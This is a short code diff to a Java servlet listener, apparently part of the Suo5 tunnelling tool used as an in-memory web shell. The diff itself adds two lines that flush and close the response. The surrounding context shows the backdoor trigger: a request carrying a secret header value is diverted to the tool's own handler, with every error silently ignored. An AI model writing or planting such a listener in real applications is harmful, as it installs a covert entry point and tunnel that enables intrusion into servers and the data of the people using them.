@@ -66,6 +66,8 @@ public class Suo5v2Listener implements ServletRequestListener, Runnable, Hostnam
             if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                 HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
                 new Suo5v2Listener().process(request, response);
+                response.getWriter().flush();
+                response.getWriter().close();
             }
         } catch (Throwable ignored) {
         }
